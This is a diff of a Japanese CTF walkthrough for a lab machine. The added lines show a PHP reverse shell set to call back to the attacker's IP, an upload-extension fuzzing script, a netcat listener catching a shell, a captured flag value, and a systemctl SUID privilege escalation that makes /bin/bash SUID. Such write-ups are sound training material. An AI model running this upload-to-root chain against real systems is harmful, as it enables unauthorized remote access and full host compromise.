@@ -167,11 +167,19 @@ $ cp /usr/share/webshells/php/php-reverse-shell.php .
 ペイロードを自分のホストに書き換える。
 
 ```php
-$ip = '10.10.8.118';
-$port = 1234;
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.23.8.118';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
 ```
 
-httpieでリクエストを送信する
+httpieでリクエストを送信するテスト
 
 ```sh
 $ http --multipart POST http://10.10.117.137:3333/internal/ file@'./php-reverse-shell.php' 
@@ -213,7 +221,21 @@ Extension not allowed</body>
 </html>
 ```
 
-攻撃用スクリプトを作成
+HTTPieを用いてファジングを行う攻撃用スクリプトを作成します。
+
+今回は、特定の拡張子を持つファイルをサーバーにPOSTリクエストするファジングを行います。対象のファイルは`php-reverse-shell.php`で、このファイルを様々な拡張子に変換してテストします。
+
+まず、以下の内容を持つ`phpext.txt`ファイルを作成します。このファイルにはテストする拡張子のリストを含めます。
+
+```txt
+.php
+.php3
+.php4
+.php5
+.phtml
+```
+
+次に、HTTPieを用いたファジングを行うBashスクリプト`script.sh`を作成します。このスクリプトは、`php-reverse-shell.php`を指定された拡張子に変換し、HTTP POSTリクエストを送信してレスポンスをチェックします。
 
 ```sh
 #!/bin/bash
@@ -239,7 +261,14 @@ while IFS= read -r ext; do
 done < phpext.txt
 ```
 
-スクリプトを実行。
+作成したスクリプトに実行権限を付与します。
+
+```sh
+$ chmod +x script.sh
+```
+
+スクリプトを実行すると、各拡張子に対してHTTPリクエストが実行され、そのレスポンスが「Extension not allowed」を含むかどうかがチェックされます。
+結果は次のように出力されました。
 
 ```sh
 $ ./script.sh                                        
@@ -273,6 +302,106 @@ Starting gobuster in directory enumeration mode
 ===============================================================
 /uploads              (Status: 301) [Size: 332] [--> http://10.10.117.137:3333/internal/uploads/]
 /css                  (Status: 301) [Size: 328] [--> http://10.10.117.137:3333/internal/css/]
+Progress: 87664 / 87665 (100.00%)
+===============================================================
+Finished
+===============================================================
 ```
 
-/uploads/に確認
+/uploads/にアップロードしたファイルがあることを確認。
+
+リバースシェルをポート1234で待ち受ける。
+
+```sh
+$ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.23.8.118] from (UNKNOWN) [10.10.24.247] 48060
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 17:01:57 up 12 min,  0 users,  load average: 0.00, 0.20, 0.30
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ pwd
+/
+$ cd /home
+$ ls
+bill
+$ ls
+user.txt
+$ cat user.txt
+8bd7992fbe8a6ad22a63361004cfcedb
+```
+
+# On the system, search for all SUID files. Which file stands out?
+
+SUIDファイルを探す。
+
+```sh
+$ find / -user root -perm -4000 2>/dev/null       
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/mount.cifs
+```
+
+/bin/systemctlがSUIDファイルになっている。
+
+# What is the root flag value?
+
+`sudo`コマンドを実行してみたが、うまくいかない。
+
+```sh
+$ sudo -l
+/bin/sh: 31: -l: not found
+```
+
+GTFObinsから`systemctl`のsudoを見つけて編集。
+
+```sh
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+sudo systemctl link $TF
+sudo systemctl enable --now $TF
+```
+
+以下のように書き換える。
+
+```sh
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+systemctl link $TF
+systemctl enable --now $TF
+```
+
+
